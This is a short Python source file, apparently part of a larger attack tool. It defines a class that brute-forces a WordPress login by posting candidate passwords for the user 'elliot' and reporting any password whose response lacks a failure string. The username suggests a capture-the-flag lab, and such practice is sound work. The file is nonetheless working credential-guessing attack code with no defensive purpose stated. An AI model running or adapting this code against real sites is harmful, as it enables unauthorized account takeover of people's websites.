import requests

from ..request_handler import RequestHandler

class WpPasswordBruteForce(RequestHandler):

    def run(self, word: str) -> str:

        data = {
            "log": "elliot",
            "pwd": word,
            }

        response = requests.post(
            url=self.url,
            data=data,
            cookies=self.cookies,
            headers=self.headers,
        )
        # print(response.status_code not in self.status_codes)
        #print(self.fail_string in response.text)
        if self.fail_string not in response.text:
            return f"Password found: {word}"
        else:
            return

